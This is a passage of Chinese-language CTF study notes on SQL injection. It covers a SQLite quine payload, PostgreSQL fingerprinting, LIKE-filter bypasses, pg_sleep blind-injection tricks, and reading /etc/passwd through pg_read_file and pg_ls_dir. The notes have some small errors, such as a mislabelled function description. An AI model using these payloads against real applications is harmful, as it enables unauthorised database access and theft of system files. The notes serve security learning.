number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token comment">--虽然没有像sleep那样精确，但是也够用了</span></code></pre><h2 id="SQLi-Quine"><a href="#SQLi-Quine" class="headerlink" title="SQLi-Quine"></a>SQLi-Quine</h2><p>在做CTF时可能遇见数据库里没有东西，但是却要求输入的与数据库查询的内容相等</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">row</span> <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token keyword">prepare</span><span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>select pw from users where id='admin' and pw='${user.pw}'<span class="token punctuation">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>typeof <span class="token keyword">row</span> <span class="token operator">!=</span><span class="token operator">=</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span>{    req<span class="token punctuation">.</span><span class="token keyword">session</span><span class="token punctuation">.</span>isAdmin <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">row</span><span class="token punctuation">.</span>pw <span class="token operator">=</span><span class="token operator">=</span><span class="token operator">=</span> <span class="token keyword">user</span><span class="token punctuation">.</span>pw<span class="token punctuation">)</span><span class="token punctuation">;</span>}<span class="token keyword">else</span>{    req<span class="token punctuation">.</span><span class="token keyword">session</span><span class="token punctuation">.</span>isAdmin <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>}</code></pre><p>上诉的<code>sql</code>语句要求输入的密码和查询的密码相等，在注入的过程中发现数据库没有东西。因此构造<code>payload</code></p><pre class="language-sql" data-language="sql"><code class="language-sql">Payload  :<span class="token string">' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||'</span> <span class="token keyword">Union</span> <span class="token keyword">select</span> <span class="token keyword">replace</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">')--Generates:'</span> <span class="token keyword">Union</span> <span class="token keyword">select</span> <span class="token keyword">replace</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||Payload  :'</span> <span class="token keyword">Union</span> <span class="token keyword">select</span> <span class="token keyword">replace</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token keyword">replace</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token keyword">replace</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">')--'</span><span class="token punctuation">)</span><span class="token comment">--')--</span>Generates:<span class="token string">' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||'</span> <span class="token keyword">Union</span> <span class="token keyword">select</span> <span class="token keyword">replace</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token keyword">replace</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||'</span><span class="token punctuation">)</span><span class="token comment">--')--')--</span></code></pre><pre class="language-sql" data-language="sql"><div class="caption"><span>lite</span></div><code class="language-sql">sqlite<span class="token operator">&gt;</span> <span class="token keyword">select</span> <span class="token string">''</span><span class="token keyword">Union</span> <span class="token keyword">select</span> <span class="token keyword">replace</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token string">' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||'</span> <span class="token keyword">Union</span> <span class="token keyword">select</span> <span class="token keyword">replace</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token operator">||</span>sqlite<span class="token operator">&gt;</span> <span class="token keyword">select</span> <span class="token string">''</span> <span class="token keyword">Union</span> <span class="token keyword">select</span> <span class="token keyword">replace</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token keyword">replace</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token keyword">replace</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">')--'</span><span class="token punctuation">)</span><span class="token comment">--')--</span>   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&gt;</span> <span class="token punctuation">;</span><span class="token string">' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||'</span> <span class="token keyword">Union</span> <span class="token keyword">select</span> <span class="token keyword">replace</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token keyword">replace</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>zeroblob<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||'</span><span class="token punctuation">)</span><span class="token comment">--')--')--</span></code></pre><p>参考题目：ASIS CTF Quals 2020 Admin Panel</p><p>生成脚本参考：<a href="https://www.shysecurity.com/post/20140705-SQLi-Quine">https://www.shysecurity.com/post/20140705-SQLi-Quine</a></p><h1 id="PostgreSQL注入"><a href="#PostgreSQL注入" class="headerlink" title="PostgreSQL注入"></a>PostgreSQL注入</h1><h2 id="注释符-2"><a href="#注释符-2" class="headerlink" title="注释符"></a>注释符</h2><pre class="language-none"><code class="language-none">/**/--两种注释符 --后面不带空格 </code></pre><p>判断是<code>plsql</code>还是<code>sqlite</code></p><pre class="language-none"><code class="language-none">--可以注释，#不可注释，则不是mysql利用exp(999999)构造报错，可判断是PostgreSQL或者测试延时盲注利用pg_sleep()postgres=# select 123 where 123 = exp(9999999);ERROR:  value out of range: overflow</code></pre><h2 id="LIKE注入"><a href="#LIKE注入" class="headerlink" title="LIKE注入"></a>LIKE注入</h2><pre class="language-sql" data-language="sql"><code class="language-sql">string <span class="token operator">LIKE</span> pattern <span class="token punctuation">[</span><span class="token keyword">ESCAPE</span> <span class="token keyword">escape</span><span class="token operator">-</span><span class="token keyword">character</span><span class="token punctuation">]</span>string <span class="token operator">NOT</span> <span class="token operator">LIKE</span> pattern <span class="token punctuation">[</span><span class="token keyword">ESCAPE</span> <span class="token keyword">escape</span><span class="token operator">-</span><span class="token keyword">character</span><span class="token punctuation">]</span></code></pre><p>在LIKE 子句中，通常与通配符结合使用，通配符表示任意字符，在PostgreSQL 中，主要有以下两种通配符（如果没有使用通配符，LIKE 子句和等号= 一样）：</p><ul><li>百分号<code>%</code></li><li>下划线<code>_</code></li></ul><p><code>_</code>匹配任意一个字符，<code>%</code>匹配0至多个任意字符。</p><p>下面是 LIKE 语句中演示了 <strong>%</strong> 和 <strong>_</strong> 的一些差别:</p><p>表格 还在加载中，请等待加载完成后再尝试复制</p><p>在 PostgreSQL 中，LIKE 子句是只能用于对字符进行比较，因此在上面例子中，我们要将整型数据类型转化为字符串数据类型。</p><p>根据活动的语言环境，可以使用关键字<code>ILIKE</code>代替<code>LIKE</code>来使匹配不区分大小写。这不是 SQL 标准，而是 PostgreSQL 扩展。</p><p>如果匹配的字符串中包含特殊字符，使用<code>escape ''</code>来选择转义任何字符</p><pre class="language-sql" data-language="sql"><code class="language-sql">spostgres<span class="token operator">=</span><span class="token comment"># select 'aaa%bbb' like 'aaa%';</span> ?<span class="token keyword">column</span>?<span class="token comment">----------</span> t<span class="token punctuation">(</span><span class="token number">1</span> <span class="token keyword">row</span><span class="token punctuation">)</span>postgres<span class="token operator">=</span><span class="token comment"># select 'aaa%bbb' like 'aaa1%' escape '1';</span> ?<span class="token keyword">column</span>?<span class="token comment">----------</span> f<span class="token punctuation">(</span><span class="token number">1</span> <span class="token keyword">row</span><span class="token punctuation">)</span>postgres<span class="token operator">=</span><span class="token comment"># select 'aaa%bbb' like 'aaa1%%' escape '1';</span> ?<span class="token keyword">column</span>?<span class="token comment">----------</span> t<span class="token punctuation">(</span><span class="token number">1</span> <span class="token keyword">row</span><span class="token punctuation">)</span>postgres<span class="token operator">=</span><span class="token comment"># select 'aaa%bbb' like 'aaa1%bb' escape '1';</span> ?<span class="token keyword">column</span>?<span class="token comment">----------</span> f<span class="token punctuation">(</span><span class="token number">1</span> <span class="token keyword">row</span><span class="token punctuation">)</span>postgres<span class="token operator">=</span><span class="token comment"># select 'aaa%bbb' like 'aaa1%bb_' escape '1';</span> ?<span class="token keyword">column</span>?<span class="token comment">----------</span> t<span class="token punctuation">(</span><span class="token number">1</span> <span class="token keyword">row</span><span class="token punctuation">)</span><span class="token comment">--可以看到使用escape之后，将1当作转义符</span></code></pre><p>如果<code>like</code>被过滤，可以使用<code>~~</code></p><pre class="language-none"><code class="language-none">postgres=# select '123' ~~ '1%'; ?column?---------- t(1 row)</code></pre><p>运算符<code>~~</code>等效于<code>LIKE</code>，而<code>~~*</code>对应于<code>ILIKE</code>。还有<code>!~~</code>和<code>!~~*</code>运算符分别代表<code>NOT LIKE</code>和<code>NOT ILIKE</code>。所有这些运算符都是特定于 PostgreSQL 的。您可能会在<code>EXPLAIN</code>输出和类似的位置看到这些运算符名称，因为解析器实际上翻译了<code>LIKE</code>等。这些运算符。</p><p><strong>类似还有****SIMILAR TO</strong></p><p><code>SIMILAR TO</code>运算符根据其模式是否与给定的字符串匹配而返回 true 或 false。它类似于<code>LIKE</code>，除了它使用 SQL 标准的正则表达式定义来解释模式。 SQL 正则表达式是<code>LIKE</code>表示法和通用正则表达式表示法之间的一个奇怪的交叉。</p><p>像<code>LIKE</code>一样，<code>SIMILAR TO</code>运算符仅在其模式与整个字符串匹配时才成功；这与常见的正则表达式行为不同，在常规行为中，模式可以匹配字符串的任何部分。与<code>LIKE</code>一样，<code>SIMILAR TO</code>使用<code>_</code>和<code>%</code>作为通配符，分别表示任何单个字符和任何字符串(在 POSIX 正则表达式中，它们分别与<code>.</code>和<code>.*</code>相类似)。</p><p>除了从<code>LIKE</code>借用的这些功能之外，<code>SIMILAR TO</code>还支持从 POSIX 正则表达式借用的这些模式匹配元字符：</p><ul><li><code>|</code>表示交替(两种选择之一)。</li><li><code>*</code>表示重复上一个项目零次或多次。</li><li><code>+</code>表示重复前一个项目一次或多次。</li><li><code>?</code>表示重复上一个项目零或一次。</li><li><code>{</code> <em>m</em> <code>MARKDOWN_HASHcbb184dd8e05c9709e5dcaedaa0495cfMARKDOWN</code><em>HASH**表示前一项正好重复</em><code>m</code> *次。</li><li><code>{</code> <em>m</em> <code>,}</code>表示重复上一项 <em>m</em> 或更多次。</li><li><code>{</code> <em>m</em> <code>,</code> <em>n</em> <code>}</code>表示前一项重复至少 <em>m</em> 但不超过 <em>n</em> 次。</li><li>括号<code>()</code>可用于将项目分组为单个逻辑项目。</li><li>与 POSIX 正则表达式一样，方括号表达式<code>[...]</code>指定字符类。</li></ul><p>请注意，句点(<code>.</code>)不是<code>SIMILAR TO</code>的元字符。</p><p>与<code>LIKE</code>一样，反斜杠会禁用任何这些元字符的特殊含义；或可以使用<code>ESCAPE</code>指定其他转义字符。</p><p>Some examples:</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token string">'abc'</span> SIMILAR <span class="token keyword">TO</span> <span class="token string">'abc'</span>      <span class="token boolean">true</span><span class="token string">'abc'</span> SIMILAR <span class="token keyword">TO</span> <span class="token string">'a'</span>        <span class="token boolean">false</span><span class="token string">'abc'</span> SIMILAR <span class="token keyword">TO</span> <span class="token string">'%(b|d)%'</span>  <span class="token boolean">true</span><span class="token string">'abc'</span> SIMILAR <span class="token keyword">TO</span> <span class="token string">'(b|c)%'</span>   <span class="token boolean">false</span></code></pre><h2 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h2><p><code>plsql</code>中并没有<code>group_concat()</code>这个函数，用聚合函数<code>array_agg()、string_agg()</code></p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--array_agg(expression) 把表达式变成一个数组</span>postgres<span class="token operator">=</span><span class="token comment"># select array_agg(name) from company;</span> array_agg<span class="token comment">-----------</span> {Paul<span class="token punctuation">,</span>cc}<span class="token punctuation">(</span><span class="token number">1</span> <span class="token keyword">row</span><span class="token punctuation">)</span><span class="token comment">--通常搭配array_to_string()使用</span>postgres<span class="token operator">=</span><span class="token comment"># select array_to_string(array_agg(name),',') from company;</span> array_to_string<span class="token comment">-----------------</span> Paul<span class="token punctuation">,</span>cc<span class="token punctuation">(</span><span class="token number">1</span> <span class="token keyword">row</span><span class="token punctuation">)</span></code></pre><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--string_agg(expression, delimiter) 直接把一个表达式变成字符串</span>postgres<span class="token operator">=</span><span class="token comment"># select string_agg(name,',')  from company;</span> string_agg<span class="token comment">------------</span> Paul<span class="token punctuation">,</span>cc<span class="token punctuation">(</span><span class="token number">1</span> <span class="token keyword">row</span><span class="token punctuation">)</span></code></pre><h2 id="延时函数"><a href="#延时函数" class="headerlink" title="延时函数"></a>延时函数</h2><p><code>pg_sleep(5)</code></p><p><strong>注意：</strong></p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--与mysql中的sleep()有所不同</span><span class="token comment">--当将pg_sleep()与布尔一起使用时会报错，因为pg_sleep返回值为空。</span>postgres<span class="token operator">=</span><span class="token comment"># select '1' = pg_sleep(1);</span>ERROR:  argument <span class="token keyword">of</span> <span class="token operator">AND</span> must be <span class="token keyword">type</span> <span class="token keyword">boolean</span><span class="token punctuation">,</span> <span class="token operator">not</span> <span class="token keyword">type</span> voidLINE <span class="token number">1</span>: <span class="token keyword">select</span> <span class="token string">'1'</span> <span class="token operator">and</span> pg_sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这里提供几种解决的办法</p><pre class="language-sql" data-language="sql"><code class="language-sql">方法<span class="token number">1</span>：<span class="token keyword">select</span> xxx <span class="token keyword">from</span> pg_sleep<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">--可以延时，并且返回xxx</span>postgres<span class="token operator">=</span><span class="token comment"># select 1 from pg_sleep(1);</span> ?<span class="token keyword">column</span>?<span class="token comment">----------</span>        <span class="token number">1</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token keyword">row</span><span class="token punctuation">)</span><span class="token comment">--通过这个就有返回值，可以比较了</span>postgres<span class="token operator">=</span><span class="token comment"># select '1'=(select '1' from pg_sleep(1));</span> ?<span class="token keyword">column</span>?<span class="token comment">----------</span> t<span class="token punctuation">(</span><span class="token number">1</span> <span class="token keyword">row</span><span class="token punctuation">)</span><span class="token comment">--可以看出plsql的数据类型比较严格，不会随意进行转换</span>方法<span class="token number">2</span>：<span class="token comment">--通过类型转换，将数据转化为字符</span>postgres<span class="token operator">=</span><span class="token comment"># select '1'=pg_sleep(1)::varchar;</span> ?<span class="token keyword">column</span>?<span class="token comment">----------</span> f<span class="token punctuation">(</span><span class="token number">1</span> <span class="token keyword">row</span><span class="token punctuation">)</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> company <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> <span class="token string">'a'</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">case</span> <span class="token keyword">when</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">then</span> pg_sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>::<span class="token keyword">VARCHAR</span> <span class="token keyword">else</span> <span class="token string">'a'</span> <span class="token keyword">end</span><span class="token punctuation">)</span><span class="token punctuation">;</span>方法<span class="token number">3</span>：<span class="token comment">--通过||</span><span class="token comment">--与mysql不一样，在plsql中，||是拼接字符串的意思</span>postgres<span class="token operator">=</span><span class="token comment"># select '1'||'asss';</span> ?<span class="token keyword">column</span>?<span class="token comment">----------</span> <span class="token number">1</span>asss<span class="token punctuation">(</span><span class="token number">1</span> <span class="token keyword">row</span><span class="token punctuation">)</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> company <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> <span class="token string">'a'</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">case</span> <span class="token keyword">when</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">then</span> pg_sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'b'</span> <span class="token keyword">else</span> <span class="token string">'a'</span> <span class="token keyword">end</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><p><code>pg_ls_dir()</code>：列出目录的内容。 默认限制为超级用户，但可以授予其他用户 EXECUTE 来运行该功能。</p><p><code>pg_read_file()</code>：列出目录的内容。 默认限制为超级用户，但可以授予其他用户 EXECUTE 来运行该功能。</p><pre class="language-sql" data-language="sql"><code class="language-sql">postgres<span class="token operator">=</span><span class="token comment"># select pg_ls_dir('/');</span> pg_ls_dir<span class="token comment">------------</span> home srv etc opt root lib mnt usr media lib64 sys dev sbin boot bin run lib32 libx32 init <span class="token keyword">proc</span> snap tmp var lost<span class="token operator">+</span>found<span class="token punctuation">(</span><span class="token number">24</span> <span class="token keyword">rows</span><span class="token punctuation">)</span>postgres<span class="token operator">=</span><span class="token comment"># select pg_ls_dir('/');</span>                                       pg_read_file<span class="token comment">-------------------------------------------------------------------------------------------</span> root:x:<span class="token number">0</span>:<span class="token number">0</span>:root:<span class="token operator">/</span>root:<span class="token operator">/</span>bin<span class="token operator">/</span>bash                                                          <span class="token operator">+</span> daemon:x:<span class="token number">1</span>:<span class="token number">1</span>:daemon:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin                                          <span class="token operator">+</span> bin:x:<span class="token number">2</span>:<span class="token number">2</span>:bin:<span class="token operator">/</span>bin:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin                                                     <span class="token operator">+</span> sys:x:<span class="token number">3</span>:<span class="token number">3</span>:sys:<span class="token operator">/</span>dev:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin                                                     <span class="token operator">+</span> sync:x:<span class="token number">4</span>:<span class="token number">65534</span>:sync:<span class="token operator">/</span>bin:<span class="token operator">/</span>bin<span class="token operator">/</span>sync                                                       <span class="token operator">+</span> games:x:<span class="token number">5</span>:<span class="token number">60</span>:games:<span class="token operator">/</span>usr<span class="token operator">/</span>games:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin                                          <span class="token operator">+</span> man:x:<span class="token number">6</span>:<span class="token number">12</span>:man:<span class="token operator">/</span>var<span class="token operator">/</span>cache<span class="token operator">/</span>man:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin                                          <span class="token operator">+</span> lp:x:<span class="token number">7</span>:<span class="token number">7</span>:lp:<span class="token operator">/</span>var<span class="token operator">/</span>spool<span class="token operator">/</span>lpd:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin                                             <span class="token operator">+</span> mail:x:<span class="token number">8</span>:<span class="token number">8</span>:mail:<span class="token operator">/</span>var<span class="token operator">/</span>mail:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin                                              <span class="token operator">+</span> news:x:<span class="token number">9</span>:<span class="token number">9</span>:news:<span class="token operator">/</span>var<span class="token operator">/</span>spool<span class="token operator">/</span>news:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin                                        <span class="token operator">+</span> uucp:x:<span class="token number">10</span>:<span class="token number">10</span>:uucp:<span class="token operator">/</span>var<span class="token operator">/</span>spool<span class="token operator">/</span>uucp:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin                                      <span class="token operator">+</span> proxy:x:<span class="token number">13</span>:<span class="token number">13</span>:proxy:<span class="token operator">/</span>bin:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin                                               <span class="token operator">+</span> www<span class="token operator">-</span><span class="token keyword">data</span>:x:<span class="token number">33</span>:<span class="token number">33</span>:www<span class="token operator">-</span><span class="token keyword">data</span>:<span class="token operator">/</span>var<span class="token operator">/</span>www:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin                                     <span class="token operator">+</span> <span class="token keyword">backup</span>:x:<span class="token number">34</span>:<span class="token number">34</span>:<span class="token keyword">backup</span>:<span class="token operator">/</span>var<span class="token operator">/</span>backups:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin                                     <span class="token operator">+</span> list:x:<span class="token number">38</span>:<span class="token number">38</span>:Mailing List Manager:<span class="token operator">/</span>var<span class="token operator">/</span>list:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin                            <span class="token operator">+</span> irc:x:<span class="token number">39</span>:<span class="token number">39</span>:ircd:<span class="token operator">/</span>var<span class="token operator">/</span>run<span class="token operator">/</span>ircd:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin                                         <span class="token operator">+</span> gnats:x:<span class="token number">41</span>:<span class="token number">41</span>:Gnats Bug<span class="token operator">-</span>Reporting System <span class="token punctuation">(</span>admin<span class="token punctuation">)</span>:<span class="token operator">/</span>var<span class="token operator">/</span>lib<span class="token operator">/</span>gnats:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin        <span class="token operator">+</span> nobody:x:<span class="token number">65534</span>:<span class="token number">65534</span>:nobody:<span class="token operator">/</span>nonexistent:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin                               <span class="token operator">+</span> systemd<span class="token operator">-</span>network:x:<span class="token number">100</span>:<span class="token number">102</span>:systemd Network Management<span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token punctuation">,</span>:<span class="token operator">/</span>run<span class="token operator">/</span>systemd:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin   <span class="token operator">+</span> systemd<span class="token operator">-</span>resolve:x:<span class="token number">101</span>:<span class="token number">103</span>:systemd Resolver<span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token punctuation">,</span>:<span class="token operator">/</span>run<span class="token operator">/</span>systemd:<span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>nologin             <span class="token operator">+</span> systemd<span class="token operator">-</span>timesync:x:<span class="token number">102</span>:<span class="token number">104</span>:systemd <span class="token keyword">Time</span> Synchronization<span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token punctuation">,</span>:<span class="token 